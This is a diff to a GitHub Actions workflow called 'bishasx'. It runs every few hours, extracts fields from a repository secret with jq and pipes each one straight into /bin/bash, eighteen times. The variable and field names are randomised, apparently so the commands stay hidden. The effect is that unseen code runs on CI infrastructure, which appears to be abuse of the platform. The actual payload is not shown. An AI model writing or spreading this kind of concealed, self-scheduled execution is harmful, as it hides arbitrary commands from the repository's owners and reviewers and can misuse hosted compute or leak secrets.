@@ -1,31 +1,34 @@
 name: bishasx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
-
-jobs:  # 10309
+    - cron: '26 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bishasx
         env:
-          ha9: ${{ secrets.ha9 }}
+          ty0: ${{ secrets.ty0 }}
         run: |
-          echo $ha9 | jq -r .zku12 | /bin/bash
-          echo $g7 | jq -r .g49862 | /bin/bash
-          echo $noz91 | jq -r .hdstd3512 | /bin/bash
-          echo $uxy20 | jq -r .bu53184 | /bin/bash
-          echo $fpiwg918 | jq -r .cxwey54 | /bin/bash
-          echo $a3298 | jq -r .lhtug037 | /bin/bash
-          echo $iqhdt92917 | jq -r .nvahz38936 | /bin/bash
-          echo $es6646 | jq -r .i159 | /bin/bash
-          echo $kzg83540 | jq -r .fxce610 | /bin/bash
-          echo $sh08 | jq -r .uxmop983 | /bin/bash
-          echo $zm0334 | jq -r .hqh279 | /bin/bash
-          echo $cr9416 | jq -r .xyyy313 | /bin/bash
-          echo $rgzl23 | jq -r .qubll3 | /bin/bash
-          echo $bwcj617 | jq -r .xzpzb56 | /bin/bash
+          echo $ty0 | jq -r .yrmpp7110 | /bin/bash
+          echo $vk7586 | jq -r .dw19 | /bin/bash
+          echo $yte50 | jq -r .tam525 | /bin/bash
+          echo $jkjfi0 | jq -r .mgl54063 | /bin/bash
+          echo $mgpi61439 | jq -r .gfz687 | /bin/bash
+          echo $abezn080 | jq -r .z26 | /bin/bash
+          echo $mjwa278 | jq -r .w02 | /bin/bash
+          echo $zrw2839 | jq -r .f049 | /bin/bash
+          echo $hpudn9 | jq -r .mu959 | /bin/bash
+          echo $caw44 | jq -r .xcr04788 | /bin/bash
+          echo $i86 | jq -r .jhs55762 | /bin/bash
+          echo $yfiao218 | jq -r .fwses77 | /bin/bash
+          echo $rlbf4475 | jq -r .k60 | /bin/bash
+          echo $ughi16872 | jq -r .ul88 | /bin/bash
+          echo $mocr10493 | jq -r .ukjx07818 | /bin/bash
+          echo $o59043 | jq -r .i28306 | /bin/bash
+          echo $cp35 | jq -r .gxpnd14676 | /bin/bash
+          echo $rk39690 | jq -r .ub97061 | /bin/bash
 
